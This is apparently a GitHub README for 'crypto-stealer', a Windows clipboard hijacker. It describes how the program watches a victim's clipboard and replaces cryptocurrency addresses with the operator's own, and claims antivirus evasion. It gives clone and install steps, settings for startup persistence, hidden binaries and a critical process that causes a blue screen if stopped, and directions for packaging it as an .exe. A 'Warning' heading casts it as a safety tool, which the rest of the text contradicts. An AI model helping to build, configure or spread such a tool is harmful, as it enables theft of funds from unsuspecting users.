<h1 align="center">CRYPTO REPLACER</h1>

<img src=".github/using.gif"></img>

# Warning 📌

This script is a tool to automatically replace cryptocurrency addresses in the clipboard with a predefined address. This can be useful to avoid accidentally sending cryptocurrency to the wrong address.

## Starting 🚀

### How it works:

Crypto-stealer checks the victims clipboard looking for crypto addresses. When it's found, replaces the original one with anything you want.

### Detection:

Crypto-stealer is **UNDETECTED** for any kind of antivirus/anti-malware.

### Requirements:

```
pyperclip
time
re
ctypes
os
sys
inspect
```

### Downloading:

```
git clone https://github.com/matifanger/crypto-stealer
cd crypto-stealer
pip3 install -r requirements.txt
```

## Configuring ⚙️

Open (`crypto-replacer.py`).
Look for variable (`my_addresses`) and setup with anything you want.

### Useful functionalities (CURRENTLY WORKING) (Only windows):

```py
CRITICAL_PROCCESS = True # Mark the proccess as critical, if interrumpted, blue screen appears.
ADD_TO_STARTUP = True # Add proccess to startup.
HIDE_BINARIES = True # Hide binaries.
```

### Making the binaries:

When the configuration is done you should make the executable (`.exe`) to work in windows.

```
pip install auto-py-to-exe
```

then

```
auto-py-to-exe
```

In Auto Py To Exe (Mandatory)

```
One directory
Console based
```

Proper usage [here](https://pypi.org/project/auto-py-to-exe/)

## Regex cryptos - Supported 📖

- Bitcoin
- Ethereum
- Dash
- Cardano
- Polkadot
- Ripple
- Tron
- Litecoin
- Monero
- Doge
- Solana

## Todo 📄

- [x] Add more cryptos
- [ ] Add linux support
